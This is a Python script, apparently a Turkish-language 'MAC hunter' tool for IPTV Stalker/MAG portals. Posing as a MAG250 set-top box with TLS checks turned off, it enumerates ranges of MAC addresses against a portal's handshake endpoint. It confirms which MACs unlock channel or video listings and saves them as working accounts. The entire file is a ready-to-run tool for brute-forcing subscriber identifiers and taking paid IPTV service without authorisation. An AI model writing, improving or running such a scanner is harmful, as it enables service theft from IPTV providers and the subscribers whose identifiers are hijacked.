import json
import logging
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger("stb_scanner")

class MACScanner:
    UA = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"

    def __init__(self, portal_url: str):
        self.portal_url = portal_url.rstrip("/")
        parsed = urlparse(self.portal_url)
        self.base_url = f"{parsed.scheme}://{parsed.netloc}"
        self._headers = {"User-Agent": self.UA, "X-User-Agent": "Model: MAG250; Link: WiFi"}
        self._file_lock = threading.Lock()
        self._candidates = [self.portal_url, self.base_url + "/c", self.base_url + "/portal.php", self.base_url + "/stalker_portal/c/"]

    def _parse(self, text: str) -> dict:
        try:
            m = re.search(r"\{.*\}", text)
            if m:
                return json.loads(m.group(0))
        except Exception:
            pass
        return {}

    def check_mac(self, full_mac: str) -> tuple:
        mac = full_mac.upper()
        headers = self._headers.copy()
        headers["Cookie"] = f"mac={mac}; stb_lang=en; timezone=Europe/Madrid"
        session = requests.Session()
        session.verify = False
        for url in self._candidates:
            try:
                r = session.get(url, params={"type": "stb", "action": "handshake", "token": "", "JsHttpRequest": "1-xml"}, headers=headers, timeout=7)
                js = self._parse(r.text)
                token = js.get("js", {}).get("token")
                if not token:
                    continue
                headers["Authorization"] = f"Bearer {token}"
                for verify_params in [{"type": "itv", "action": "get_genres", "JsHttpRequest": "1-xml"}, {"type": "video", "action": "get_categories", "JsHttpRequest": "1-xml"}]:
                    v = session.get(url, params=verify_params, headers=headers, timeout=7)
                    vjs = self._parse(v.text)
                    data = vjs.get("js", [])
                    if data and len(data) > 0:
                        return mac, len(data), verify_params["type"]
            except Exception:
                continue
            finally:
                session.close()
        return None, 0, None

    def scan(self, mac_list: list, threads: int = 15, output_file: str = "working_macs.txt") -> list:
        found = []
        total = len(mac_list)
        done = 0
        f_lock = self._file_lock
        log.info("[SCAN] %d MAC taranıyor (%d thread)...", total, threads)
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(self.check_mac, m): m for m in mac_list}
            for future in as_completed(futures):
                done += 1
                try:
                    mac, count, ctype = future.result()
                except Exception as exc:
                    log.debug("Future hatası: %s", exc)
                    mac = None
                if mac:
                    found.append(mac)
                    log.info("[!!!] BULUNDU: %s (%d içerik, %s)", mac, count, ctype)
                    with f_lock:
                        with open(output_file, "a", encoding="utf-8") as f:
                            f.write(f"{mac} | {count}+ items | {ctype} | {self.portal_url} | {time.strftime('%Y-%m-%d %H:%M')}\n")
                pct = done / total * 100
                print(f"    > İlerleme: {done}/{total} [%{pct:.1f}] | Bulunan: {len(found)}", end="\r")
        print()
        return found

def _build_mac_list(prefix: str, sub: str, start_hex: str, count: int = 1000) -> list:
    base = int(start_hex, 16)
    macs = []
    for i in range(count):
        val = base + i
        if val > 0xFFFF:
            break
        h = hex(val)[2:].upper().zfill(4)
        macs.append(f"{prefix}:{sub}:{h[:2]}:{h[2:]}")
    return macs

def main():
    import logging as _log
    _log.basicConfig(level=_log.INFO, format="%(message)s")
    print("STB MAC SCANNER — VİPEMUHUNTER\n" + "=" * 45)
    url = input("Portal URL:  ").strip()
    if not url:
        return
    raw_prefix = input("MAC Prefix (örn 10:27:BE):  ").strip()
    prefix = re.sub(r"[^0-9A-Fa-f:]", "", raw_prefix).strip(":")
    scanner = MACScanner(url)
    test_mac = f"{prefix}:24:1B:9F"
    print(f"\n[*] SELF-TEST: {test_mac} deneniyor...")
    m, cnt, t = scanner.check_mac(test_mac)
    if m:
        print(f"[+] TEST BAŞARILI! {cnt} içerik ({t})")
    else:
        print("[!] TEST BAŞARISIZ — VPN/proxy veya yanlış MAC prefix?")
        if input("[?] Yine de devam? (e/h):  ").strip().lower() != "e":
            return
    sub_start = input("\nSub-prefix (örn 24):  ").strip().upper()
    start_hex = input("Başlangıç suffix (örn 1B00):  ").strip().upper()
    threads = int(input("Thread sayısı (5-25 önerilen):  ").strip() or "15")
    mac_list = _build_mac_list(prefix, sub_start, start_hex)
    print(f"\n[*] {len(mac_list)} MAC taranacak...\n")
    found = scanner.scan(mac_list, threads=threads, output_file="working_macs.txt")
    print(f"\n[+] Tarama bitti. {len(found)} çalışan hesap bulundu.")
    if found:
        print("   Sonuçlar 'working_macs.txt' dosyasına kaydedildi.")

if __name__ == "__main__":
    main()
